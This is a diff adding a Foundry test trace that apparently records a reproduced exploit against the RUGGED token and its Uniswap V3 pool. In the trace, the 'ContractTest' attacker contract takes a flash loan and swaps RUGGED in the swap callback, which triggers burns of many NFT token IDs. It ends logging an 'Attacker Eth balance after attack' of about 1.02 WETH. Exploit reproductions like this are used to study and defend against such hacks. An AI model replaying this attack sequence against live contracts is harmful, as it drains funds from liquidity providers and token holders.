+    │   │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 1 → 0
+    │   │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 1 → 0
+    │   │   │   │   @ 0x6fb6557de3395141aa9888cf395b4ffde37db51885d9441c1ec68fa29c9426c1: 18 → 0
+    │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 25 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea3: 0 → 8866
+    │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x5e32d5a093587ea83172d78e4cf06f0f12106514810a73d0f00754720c616eba: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 1 → 0
+    │   │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 33 → 0
+    │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 38 → 0
+    │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e97: 0 → 3978
+    │   │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 35 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e96: 0 → 4984
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da7: 9192 → 0
+    │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 39 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e98: 0 → 3525
+    │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 27 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da4: 3033 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da9: 9017 → 0
+    │   │   │   │   @ 0x504bc497861524e4f3253374b489f795e782adf5020e9e57a36098f9643e6e4f: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9d: 0 → 9192
+    │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 21 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 356631570739218611936 [3.566e20]
+    │   ├─ [534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 22000000000000000000 [2.2e19], amount1: 0, paid0: 66000000000000000 [6.6e16], paid1: 0)
+    │   ├─  storage changes:
+    │   │   @ 1: 0x000000000000000000000000000000003a7699bbc9c96c3deec57c059f546883 → 0x000000000000000000000000000000003aa88b9ffe2882fded2e2b9b65b33411
+    │   └─ ← [Stop]
+    ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 18016421081864000000 [1.801e19]
+    ├─ [633654] pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 18016421081864000000 [1.801e19], 4295128740 [4.295e9], 0x61)
+    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1023851896415447765 [1.023e18])
+    │   │   ├─ emit Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1023851896415447765 [1.023e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000000e3573e00c73ead5
+    │   │   │   @ 0x915702112e720f3803b98e5e7e2e96395c82ee256d913fe1f4a2358e93a7c7e1: 0x0000000000000000000000000000000000000000000000012863cbff3bd529ef → 0x0000000000000000000000000000000000000000000000011a2e581f2f613f1a
+    │   │   └─ ← [Return] true
+    │   ├─ [630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 356631570739218611936 [3.566e20]
+    │   ├─ [576330] ContractTest::uniswapV3SwapCallback(18016421081864000000 [1.801e19], -1023851896415447765 [-1.023e18], 0x61)
+    │   │   ├─ [266] pool::token0() [staticcall]
+    │   │   │   └─ ← [Return] RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F]
+    │   │   ├─ [573788] RUGGED::transfer(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 18016421081864000000 [1.801e19])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8565)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6115)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2628)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9307)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4825)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8298)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2178)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 454)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 5301)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1922)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3061)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6901)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1878)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2740)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3145)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2347)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 5163)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9721)
+    │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], amount: 18016421081864000000 [1.801e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x872e7f9f7462ef7a0e5efd05076b73b65d2ce8f2ada2ecddc8404a11d481b8c6: 5 → 0
+    │   │   │   │   @ 0x0c8e29e5c3c5e5a955d23e008a0f020d8d53d6cafdaed173b7ee3d98026d9203: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xc44e133743d3b6295b51b8fa55477e753b7bed529f4012071e26ceeef19ce249: 9 → 0
+    │   │   │   │   @ 0x3f27bad07d66f01a13e4dca028de45479910dc964566275ff6bfb3bb3207ec2d: 1 → 0
+    │   │   │   │   @ 0x82f4d7c11375b87ddfb81e798edced85ca4e17c63404f3faeb689d8ba2aa5a8f: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea8: 0 → 6115
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eae: 0 → 454
+    │   │   │   │   @ 0x005c6ed66846fc515ed43c3a7e1e64071c3e3de822e0aa78beb8011e21b028c7: 7 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 1878 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 4825 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ead: 0 → 2178
+    │   │   │   │   @ 0x7c7ec41f0fe372c56501c68fd98a087764885a027016bf9746b8fd54fe0df27d: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb0: 0 → 1922
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 2628 → 0
+    │   │   │   │   @ 5: 4343 → 4361
+    │   │   │   │   @ 0x135cf6d18023edee06366a283ef957c17bc8b8cfaac068cc23d9db87ba8679d1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x817844a56a10400b5a0ac9915d9efbef84df08c489c1f6bbe1538f791f470152: 1 → 0
+    │   │   │   │   @ 0x1aa357a72ac6cef8a628616782ff99e86fb3930371d27c8f70f7aa9e81dbf9db: 17 → 0
+    │   │   │   │   @ 0x6e371ab298d0c967d21204d9cdbf6c8cb65922083ca8f8a9f108502074c2fde5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x26756a58c06be82225c58452e74884c1bc536dd536163ed32052baf0161d7d40: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea7: 0 → 8565
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb5: 0 → 3145
+    │   │   │   │   @ 0x8fe9c7761fb3cbc9ba6fd3831fbece59bb1def254dead1d1481e9454208ae9fb: 1 → 0
+    │   │   │   │   @ 0xcca05c8af9cc32c65ebff8406e489e0983b1e51968f66b29cda56497843c7da7: 13 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 6115 → 0
+    │   │   │   │   @ 0x70d14f64198fc84935b563f3fbc037601cd4b04ce777cc8059042c398ffac7df: 1 → 0
+    │   │   │   │   @ 0x42988fb2c63d1fe882de023bd02490c0205d477bb3ad273495cf1754a7dcc067: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 2178 → 0
+    │   │   │   │   @ 0x887529a192ce9ebe7537a9caab5b33fc14569cb7eb551250f939ce002fe166ec: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb4: 0 → 2740
+    │   │   │   │   @ 0xa2133436b58a260f8d006c27fb45bb008e0a093024f113527ab0cae7cf6546f5: 15 → 0
+    │   │   │   │   @ 0x4796c0d0de7d82a152318260b85e11da98682a79138229bc7448d55c9dcb2524: 1 → 0
+    │   │   │   │   @ 0x3355c01dc6e56c347923e44bfab018cce5e69e9a0387020066709d5119f1b442: 1 → 0
+    │   │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000135541dc1280b7fee0 → 0x0000000000000000000000000000000000000000000000144f490b975514d0e0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 6901 → 0
+    │   │   │   │   @ 0x095824e88dea8d46c87f19b8a6713c69c79d72628d4cca70e6a6bac672024011: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 9307 → 0
+    │   │   │   │   @ 0xc1860ce56ba86a1c2302c502ec1f8e3e57a8623b3970a44749756c6a2fc4cf2d: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 3061 → 0
+    │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000fa072f84d45cd200 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 8298 → 0
+    │   │   │   │   @ 0x4b0ca68d5c930d1fb6dab784de2b1e3ba61a507389545b34f08a6ebfbf223465: 1 → 0
+    │   │   │   │   @ 0xc9f666f45d0a0b19c89a6e44a37411863c4f5fb578ced965b0da04773f9b97f8: 1 → 0
+    │   │   │   │   @ 0xe244fb5fa0726d3288990465e011945de3c92b84ad73f9120b1478d38a848c98: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xb775dab96be1e8e7c15e77effa45a1c6e6f5c40d88035a5fc55eadbf8002a215: 1 → 0
+    │   │   │   │   @ 0x84288e8807e18f9bb068ee64f35b6c8f0658750997493a087aadee42e9297dd7: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x228853ddf7f3c5a0e9dd7666efc7af3453bacc425b0915f61f65274a0a38d3f4: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb1: 0 → 3061
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eaf: 0 → 5301
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb6: 0 → 2347
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 2740 → 0
+    │   │   │   │   @ 0xb0ec549f98926cc0f4ede0edd2042cf2df3d2301ffcaff963552b32db760c658: 16 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d95: 5301 → 0
+    │   │   │   │   @ 0x2326ab6702a02ea3c0f5aad3d47f42d2fff3a2688695f6fc1c23bca41f6ac412: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xea5bac3847a92cfb69dbc3e3b8df56ce60f3e5353b699f632ac727108537d369: 1 → 0
+    │   │   │   │   @ 0x256f28a6cf5b51dfe30a7eb91f0d1b5def2a468611a6719352d94523d4142c40: 14 → 0
+    │   │   │   │   @ 0xcfe472b282397ccc0aa9b6d353d29ea317de3c9712642b57f42dbd1770851de3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb3: 0 → 1878
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d96: 454 → 0
+    │   │   │   │   @ 0x27d8f81e1f58be87ee553445d6f3373ee873f21effca55f9a399fe791f264291: 2 → 0
+    │   │   │   │   @ 0x5d33b97014764403556a041289e1b829afd50b25dbb655fd0f30ffd733fb45f4: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xcd28ed704c7e393a43ef4603b97640b809b31399d535f701d8464c1b6511af8e: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 8565 → 0
+    │   │   │   │   @ 0x49a5885a350910d8cf696d3029d168cbf7f45629acb2ca670894878590048e18: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xea9262cafadd8bfc07ea22f5a9768a91a14a222ac5be91ac103413514df66635: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xdac4bedf7739b64c307454762b548637a94337646a9b79d97a181db75c0f9faf: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x3f37188561f05222e10316ba525fc5d5dcb8078ac115fb3db3271db36d087659: 4 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb2: 0 → 6901
+    │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 18 → 0
+    │   │   │   │   @ 0x74ac6e6de663790d1fa67c929abf27631d19f0eab8be5711cb672475f886477b: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 3145 → 0
+    │   │   │   │   @ 0xe18e36c8e0ab66bd4eb03141b8fc83ed98cc10b4ce5d11d8d95cc8feef0e9848: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eab: 0 → 4825
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 2347 → 0
+    │   │   │   │   @ 0x9a69d1e9401edab34a51f000f56e3ed9803e0fac3ef672554259888b014940d5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb7: 0 → 5163
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 1922 → 0
+    │   │   │   │   @ 0xbf90d4ce4f35a20b42c6322f5edac4f5d6e008cdeb508abdc20a0b6ed7ebf625: 11 → 0
+    │   │   │   │   @ 0x2b61c6014dd1218b919a2b632c5dcc2a61bdde548433a800da90f716b805a9ac: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x617cb31547f437c7de7c40f0c8d3403e5581ba9130efde86c6ed1ec79aae0c3a: 6 → 0
+    │   │   │   │   @ 0x89a9edcc164e1fdaa7edb3689fd08bc9655a5ff49922743da29d68a2b8aa8a74: 3 → 0
+    │   │   │   │   @ 0xf02b4f5de0eca8225398cd400fd9ef67aa21c25f9048703d3cd6531cdf6289ae: 8 → 0
+    │   │   │   │   @ 0x99790ed31a639a03e11d0e13e1cdd2a459dbef1bf54071860ec8cbbacc4320a1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 5163 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea9: 0 → 2628
+    │   │   │   │   @ 0x61f7369885a0dd718a6f919c3f78d333508681d85ea33a7c78004dc138372bd1: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb8: 0 → 9721
+    │   │   │   │   @ 0x69eeee6e805ddea357ec4d9ba86852ef9a2e4985bb7964fe0396d727e878d38b: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eac: 0 → 8298
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 9721 → 0
+    │   │   │   │   @ 0x8f2552b79692e047edc9e936c597204f5f37dd6b1f82511ddcc9274c9b87c401: 12 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eaa: 0 → 9307
+    │   │   │   │   @ 0xd0aac865598ead2df167f99cfa8c554668e5c7e85e12543a2972f26fa6d4639e: 10 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 374647991821082611936 [3.746e20]
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 18016421081864000000 [1.801e19], amount1: -1023851896415447765 [-1.023e18], sqrtPriceX96: 18452898894320704819918507625 [1.845e28], liquidity: 86602976614577154960 [8.66e19], tick: -29144 [-2.914e4])
+    │   ├─  storage changes:
+    │   │   @ 0: 0x000100000100010000ff920600000000000000003ea6abaf6969aa3ce01e7ea8 → 0x000100000100010000ff8e2800000000000000003b9fe1557e6fcea7b5778e69
+    │   │   @ 8: 0x01000000000000000000032e3c95d4e4230ea3d30dfffffb2089de2865d35cab → 0x01000000000000000000032eb7467cce822911e135fffffb1f926ba865d35eeb
+    │   │   @ 1: 0x000000000000000000000000000000003aa88b9ffe2882fded2e2b9b65b33411 → 0x000000000000000000000000000000003ad1725a380919caf66bc7850cbf52e2
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000fa072f84d45cd200fffffffffffffffffffffffffffffffffffffffffffffffff1ca8c1ff38c152b
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1023851896415447765 [1.023e18]
+    ├─ emit log_named_uint(key: "Attacker Eth balance after attack:", val: 1023851896415447765 [1.023e18])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 168.35s (167.28s CPU time)
+
+Ran 1 test suite in 171.70s (168.35s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
